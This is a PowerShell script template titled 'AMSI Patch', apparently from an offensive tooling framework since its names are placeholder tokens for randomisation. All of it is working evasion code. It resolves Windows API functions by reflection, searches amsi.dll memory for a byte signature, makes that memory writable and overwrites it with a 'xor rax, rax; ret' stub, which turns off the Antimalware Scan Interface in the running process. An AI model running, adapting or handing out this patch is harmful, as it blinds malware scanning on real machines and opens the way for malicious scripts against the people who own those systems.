# AMSI Patch
# Modified By: Shantanu Khandelwal (@shantanukhande)
# Original Author: Paul Laîné (@am0nsec)
#

Class %{cls_Hunter} {
    static [IntPtr] %{mth_FindAddress}([IntPtr]$%{var_address}, [byte[]]$%{var_egg}) {
        while ($true) {
            [int]$%{var_count} = 0;

            while ($true) {
                [IntPtr]$%{var_address} = [IntPtr]::Add($%{var_address}, 1);
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($%{var_address}) -eq $%{var_egg}.Get($%{var_count})) {
                    $%{var_count}++;
                    If ($%{var_count} -eq $%{var_egg}.Length) {
                        return [IntPtr]::Subtract($%{var_address}, $%{var_egg}.Length - 1);
                    }
                } Else { break }
            }
        }

        return $%{var_address};
    }
}
function %{func_get_proc_address} {
    Param ($%{var_module}, $%{var_procedure});
    $%{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');

    return $%{var_unsafe_native_methods}.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($%{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null, @($%{var_module})))), $%{var_procedure}));
}
function %{func_get_delegate_type} {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%{var_parameters},
        [Parameter(Position = 1)] [Type] $%{var_return_type} = [Void]
    );

    $%{var_type_builder} = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);
    $%{var_type_builder}.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%{var_parameters}).SetImplementationFlags('Runtime, Managed');
    $%{var_type_builder}.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%{var_return_type}, $%{var_parameters}).SetImplementationFlags('Runtime, Managed');

    return $%{var_type_builder}.CreateType();
}
$%{var_LoadLibraryAddr} = %{func_get_proc_address} kernel32.dll LoadLibraryA;
$%{var_LoadLibraryDelegate} = %{func_get_delegate_type} @([String]) ([IntPtr]);
$%{var_LoadLibrary} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_LoadLibraryAddr}, $%{var_LoadLibraryDelegate});
$%{var_GetProcAddressAddr} = %{func_get_proc_address} kernel32.dll GetProcAddress;
$%{var_GetProcAddressDelegate} = %{func_get_delegate_type} @([IntPtr], [String]) ([IntPtr]);
$%{var_GetProcAddress} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_GetProcAddressAddr}, $%{var_GetProcAddressDelegate});
$%{var_VirtualProtectAddr} = %{func_get_proc_address} kernel32.dll VirtualProtect;
$%{var_VirtualProtectDelegate} =  %{func_get_delegate_type} @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]);
$%{var_VirtualProtect} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($%{var_VirtualProtectAddr}, $%{var_VirtualProtectDelegate});


If ([IntPtr]::Size -eq 8) {
    # Write-Host "[+] 64-bits process";
    [byte[]]$%{var_egg} = [byte[]] (
        # mov     r11,rsp
        0x4C, 0x8B, 0xDC,
        # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x5B, 0x08,
        # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x6B, 0x10,
        # mov     qword ptr [r11+18h],rsi
        0x49, 0x89, 0x73, 0x18,
        # push    rdi
        0x57,
        # push    r14
        0x41, 0x56,
        # push    r15
        0x41, 0x57,
        # sub     rsp,70h
        0x48, 0x83, 0xEC, 0x70
    );
} Else {
    # Write-Host "[+] 32-bits process";
    [byte[]]$%{var_egg} = [byte[]] (
        # mov     edi,edi
        0x8B, 0xFF,
        # push    ebp
        0x55,
        # mov     ebp,esp
        0x8B, 0xEC,
        # sub     esp,18h
        0x83, 0xEC, 0x18,
        # push    ebx
        0x53,
        # push    esi
        0x56
    );
}


$%{var_hModule} = $%{var_LoadLibrary}.Invoke("amsi.dll");
# Write-Host "[+] AMSI DLL Handle: $%{var_hModule}";
$%{var_DllGetClassObjectAddress} = $%{var_GetProcAddress}.Invoke($%{var_hModule}, "DllGetClassObject");
# Write-Host "[+] DllGetClassObject address: $%{var_DllGetClassObjectAddress}";
[IntPtr]$%{var_targetedAddress} = [%{cls_Hunter}]::%{mth_FindAddress}($%{var_DllGetClassObjectAddress}, $%{var_egg});
# Write-Host "[+] Targeted address: $%{var_targetedAddress}";

$%{var_oldProtectionBuffer} = 0;
$%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, 4, [ref]$%{var_oldProtectionBuffer}) | Out-Null;

$patch = [byte[]] (
    # xor rax, rax
    0x31, 0xC0,
    # ret
    0xC3
);
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $%{var_targetedAddress}, 3);

$a = 0;
$%{var_VirtualProtect}.Invoke($%{var_targetedAddress}, [uint32]2, $%{var_oldProtectionBuffer}, [ref]$a) | Out-Null;
